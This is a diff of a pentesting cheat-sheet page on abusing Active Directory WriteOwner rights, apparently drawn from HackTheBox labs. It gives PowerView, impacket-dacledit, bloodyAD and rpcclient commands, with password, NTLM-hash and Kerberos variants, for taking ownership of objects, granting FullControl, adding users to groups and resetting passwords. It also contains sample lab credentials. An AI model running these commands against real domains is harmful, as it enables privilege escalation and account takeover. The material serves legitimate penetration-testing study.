@@ -10,13 +10,22 @@ tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domai
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
+#### 1. Powerview.py
+
 ```console
-# With password
+# Password
 sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 ```console
-Set-DomainObjectOwner -TargetIdentity '<TARGET>' -PrincipalIdentity '<TARGET_USER>'
+# NTLM
+sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
+```
+
+#### 2. Change Owner
+
+```console
+Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>'
 ```
 
 {{< /tabcontent >}}
@@ -32,10 +41,10 @@ Set-DomainObjectOwner -TargetIdentity '<TARGET>' -PrincipalIdentity '<TARGET_USE
 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
 ```
 
-#### 2. Change owner
+#### 2. Change Owner
 
 ```console
-Set-DomainObjectOwner -Identity '<TARGET>' -OwnerIdentity '<TARGET_USER>'
+Set-DomainObjectOwner -Identity '<TARGET_IDENTITY>' -OwnerIdentity '<TARGET_USER>'
 ```
 
 ```console {class="sample-code"}
@@ -46,37 +55,33 @@ Set-DomainObjectOwner -Identity '<TARGET>' -OwnerIdentity '<TARGET_USER>'
 
 ---
 
-### Abuse #2 : Add user to the group
+### Abuse #2 : Add User to the Group
 
 {{< tab set2 tab1 >}}Linux{{< /tab >}}{{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{<  tabcontent set2 tab1  >}}
 
-#### 1. Add full control permission to the user over the group
+#### 1. Add Full Control to the User Over the Group
 
 {{< tab set2-1 tab1 active >}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}bloodyAD{{< /tab >}}{{< tab set2-1 tab3 >}}powerview.py{{< /tab >}}
 {{< tabcontent set2-1 tab1 >}}
 
 ```console
-# Install latest impacket (included dacledit.py)
-git clone https://github.com/fortra/impacket.git
+# Password
+sudo ntpdate -s <DC> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
 ```
 
 ```console
-cd impacket
+# NTLM
+sudo ntpdate -s <DC> && impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
 ```
 
 ```console
-pip3 install .
-```
-
-<br>
-
-```console
-sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<GROUP>' -inheritance -action write -rights FullControl
+# Kerberos
+sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.absolute.htb && dacledit.py -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal 'm.lovegod' -target 'NETWORK AUDIT' -inheritance -action write -rights FullControl
+$ sudo ntpdate -s dc.absolute.htb && impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal 'm.lovegod' -target 'NETWORK AUDIT' -inheritance -action write -rights FullControl
 Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
@@ -89,8 +94,18 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 {{< tabcontent set2-1 tab2 >}}
 
 ```console
-# With Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<GROUP>' '<USER>'
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
+```
+
+```console
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -P ':<HASH>' -f rc4 --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
+```
+
+```console
+# Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -102,17 +117,22 @@ $ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.ab
 {{< tabcontent set2-1 tab3 >}}
 
 ```console
-# With password
+# Password
 sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 ```console
-Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
+# NTLM
+sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
+```
+
+```console
+Add-DomainObjectAcl -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<USER>' -Rights fullcontrol
 ```
 
 {{< /tabcontent >}}
 
-#### 2. Add the user to group
+#### 2. Add User to the Group
 
 {{< tab set2-2 tab1 active >}}rpc{{< /tab >}}{{< tab set2-2 tab2 >}}bloodyAD{{< /tab >}}{{< tab set2-2 tab3 >}}powerview.py{{< /tab >}}
 {{< tabcontent set2-2 tab1 >}}
@@ -151,6 +171,17 @@ Password for [WORKGROUP\m.lovegod]:
 {{< tabcontent set2-2 tab2 >}}
 
 ```console
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+```
+
+```console
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
+```
+
+```console
+# Kerberos
 bloodyAD -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
@@ -205,7 +236,7 @@ Get-DomainGroupMember -Identity '<GROUP>'
 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -219,7 +250,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-#### 3. Add user to group
+#### 3. Add User to the Group
 
 ```console
 Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity '<USER>' -Rights All -DomainController <DC> -Credential $cred
@@ -316,7 +347,7 @@ Mandatory Label\High Mandatory Level          Label            S-1-16-12288
 
 ---
 
-### Abuse #3 : Change target user password (From Linux)
+### Abuse #3 : Change Target User Password (From Linux)
 
 {{< tab set3 tab1 >}}BloodyAD{{< /tab >}}
 {{< tab set3 tab2 >}}rpcclient{{< /tab >}}
@@ -346,7 +377,7 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 
 {{< /tabcontent >}}
 
-### Abuse #3 : Change target user password (From Windows)
+### Abuse #3 : Change Target User Password (From Windows)
 
 {{< tab set4 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
@@ -361,7 +392,7 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
